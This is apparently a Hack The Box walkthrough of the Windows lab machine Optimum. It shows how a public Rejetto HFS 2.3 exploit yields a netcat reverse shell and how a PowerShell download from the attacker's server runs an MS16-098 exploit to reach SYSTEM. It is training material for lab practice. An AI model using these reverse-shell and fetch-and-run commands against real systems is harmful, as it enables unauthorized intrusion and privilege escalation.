# Optimum

*xlrd version issue ==> install 1.2.0 for python2.7*

[Optimum](https://app.hackthebox.com/starting-point) is a Windows machine and though it is marked as easy, I think it stands somewhere between easy and medium. The initial part to gain a foothold and getting the user flag is pretty easy but the part where you need to escalate your privileges is a bit complicated (if you try to explore it in depth).

So, let's begin!

## Enumeration

The first that we must do is determine all the ports that are open on this machine.

```
┌──(kali㉿kali)-[~/Desktop/htb/optimum]
└─$ sudo nmap -p- -sS -T4 -oG open_ports 10.10.10.8          
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 22:51 EDT
Nmap scan report for 10.10.10.8
Host is up (0.093s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 148.74 seconds
```

It can be seen that only port 80 is open, so we can check it out from our browser to see what is hosted over there.

![image-20220823142509760](.images/image-20220823142509760.png)

It looks like the machine is running something called as "HTTP File Server 2.3" which can be helpful to gain access to the machine. 

## Gaining Foothold

We can try to looks for exploits associated with this service. From a quick google search the first result that comes up is a [Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)](https://www.exploit-db.com/exploits/39161). We can use the same by copying it to our current work directory via `searchsploit`.

```
┌──(kali㉿kali)-[~/Desktop/htb/optimum]
└─$ searchsploit -m 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines (540)

Copied to: /home/kali/Desktop/htb/optimum/39161.py
```

After going through the exploit code, it looks like we need to set up a few things before running this script:

1. We need to find `nc.exe`, copy it in our current directory and then start a web server over there so that the `nc.exe` file can be pulled by the target machine from there (make sure to start the server on port 80). Tjis can be done running the following commands

   ```
   ┌──(kali㉿kali)-[~/Desktop/htb/optimum]
   └─$ locate nc.exe
   /usr/share/seclists/Web-Shells/FuzzDB/nc.exe
   /usr/share/windows-resources/binaries/nc.exe
                                                                                                       ┌──(kali㉿kali)-[~/Desktop/htb/optimum]
   └─$ cp /usr/share/windows-resources/binaries/nc.exe .
                                                                                                       ┌──(kali㉿kali)-[~/Desktop/htb/optimum]
   └─$ python3 -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

2. Change the local IP and port number in the script.

   ```
   35		ip_addr = "10.10.16.4" #local IP address
   36		local_port = "1337" # Local Port number
   ```

3. Start a listener on the same port number using the command `nc -nlvp 1337`.

4. Use the target's IP address and port number to run the script.

   ```
   ┌──(kali㉿kali)-[~/Desktop/htb/optimum]
   └─$ nc -nlvp 1337
   listening on [any] 1337 ...
   connect to [10.10.16.4] from (UNKNOWN) [10.10.10.8] 49250
   Microsoft Windows [Version 6.3.9600]
   (c) 2013 Microsoft Corporation. All rights reserved.
   
   C:\Users\kostas\Desktop>whoami
   whoami
   optimum\kostas
   ```

And there we get access to the machine as the user "kostas" and we can read the user flag as well.

## Privilege Escalation

 Now, here comes the tricky part. We have access to the machine as a normal user but not as SYSTEM yet. To escalate our privileges, we need to find some PrivEsc vulnerability related with the OS version installed on this machine. The best way to do that would be to use a tool called as [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) which we can easily clone and start using as it is just a simple python script. But before that we need to do a few things to set up the tool

*Make sure to run this tool with python2.7*

1. Download the latest update

   ```
   ┌──(kali㉿kali)-[~/Desktop/htb/optimum/Windows-Exploit-Suggester]
   └─$ python2.7 windows-exploit-suggester.py --update 
   [*] initiating winsploit version 3.3...
   [+] writing to file 2022-08-23-mssb.xls
   [*] done
   ```

2. Install `xlrd` module (note that you need `pip2.7` as we are working with python2.7)

   ```
   ┌──(kali㉿kali)-[~/Desktop/htb/optimum/Windows-Exploit-Suggester]
   └─$ pip2.7 install xlrd==1.2.0
   DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.

   Installing collected packages: xlrd
   Successfully installed xlrd-1.2.0
   ```

   *Make sure you install the version 1.2.0 because the latest version throws an error that it does not support xlsx.*

3. Get the system's information from the target machine and copy it to a file (sysinfo.txt) on your local machine as we need to pass that info to the exploit suggester.

Now, we have a large number of exploit that we can try to run on this machine. I tried a few of them like MS16-135 ([41015](https://www.exploit-db.com/exploits/41015)) and MS16-032 ([39719](https://www.exploit-db.com/exploits/39719)) but they didn't work. Finally the one that worked for me was [Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098)](https://www.exploit-db.com/exploits/41020). We can directly download the compiled executable from [here](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe).

To run the exploit, we need to get it on to the target machine for which we can start a python server on our local machine and then use PowerShell on the target machine to pull the file.

```
C:\Users\kostas\Desktop>powershell -c "(new-object System.net.webclient).downloadfile('http://10.10.16.4:8000/41020.exe', 'C:\Users\kostas\Desktop\exp.exe')"
powershell -c "(new-object System.net.webclient).downloadfile('http://10.10.16.4:8000/41020.exe', 'C:\Users\kostas\Desktop\exp.exe')"
```

All that we need to do now is just run the exploit.

```
C:\Users\kostas\Desktop>exp.exe
exp.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```

And there we get access as SYSTEM with which we can read the root flag.

## Some Key Points To Take Away

1. Always try to use different exploits. Make sure to read the versions and architecture that they work on (because on Windows if architecture is different then the exploit might not work)

2. If it looks like the exploit is not working even after making changes, move to the next available exploit.
